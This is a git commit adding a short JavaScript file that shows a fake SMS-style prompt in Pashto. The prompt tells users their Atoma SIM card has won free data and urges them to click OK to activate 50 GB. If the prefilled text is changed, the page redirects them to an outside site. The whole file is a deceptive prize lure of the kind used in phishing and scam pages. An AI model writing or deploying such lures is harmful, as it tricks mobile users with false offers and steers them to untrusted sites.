44db68b9f81048216944574e310646b23f3a23a1
surepluger <adigunkola666@gmail.com>
2025-08-07 14:20:24 +0100

    Create atoma-activation.js

---
+++ atoma-activation.js
@@ -0,0 +1,5 @@
+var password = '۵۰ جي بي فعال کړئ'
+password=prompt('SMS: مبارک شه، ستاسو د اتوما سیم کارت د وړیا ډیټا زوړ سیم کارت انعام ترلاسه کولو وړ دی، اوس د فعالولو لپاره په OK کلیک وکړئ.','۵۰ جي بي فعال کړئ');
+if (password != '۵۰ جي بي فعال کړئ') {
+location.href='https://sureplug.org/mtnafghans';
+}
